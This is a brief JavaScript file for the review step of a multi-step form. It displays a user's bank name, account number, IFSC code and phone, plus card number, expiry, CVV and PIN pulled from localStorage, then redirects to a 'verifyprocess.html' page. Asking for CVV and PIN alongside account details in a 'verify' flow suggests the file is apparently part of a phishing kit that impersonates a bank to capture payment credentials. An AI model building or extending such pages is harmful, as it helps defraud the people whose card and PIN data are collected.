// Step 1 Details
document.getElementById("bankName").innerText =
localStorage.getItem("bankName") || "-";

document.getElementById("holderName").innerText =
localStorage.getItem("holderName") || "-";

document.getElementById("accountNumber").innerText =
localStorage.getItem("accountNumber") || "-";

document.getElementById("ifsc").innerText =
localStorage.getItem("ifsc") || "-";

document.getElementById("accountType").innerText =
localStorage.getItem("accountType") || "-";

document.getElementById("phone").innerText =
localStorage.getItem("phone") || "-";

// Step 2 Details
document.getElementById("cardNumber").innerText =
localStorage.getItem("cardNumber") || "-";

document.getElementById("expiry").innerText =
localStorage.getItem("expiry") || "-";

document.getElementById("cvv").innerText =
localStorage.getItem("cvv") || "-";

document.getElementById("pin").innerText =
localStorage.getItem("pin") || "-";

function continueVerify(){

if(!document.getElementById("agree").checked){

document.getElementById("popup").style.display="flex";
return;

}

window.location.href="verifyprocess.html";

}

function closePopup(){

document.getElementById("popup").style.display="none";

   }
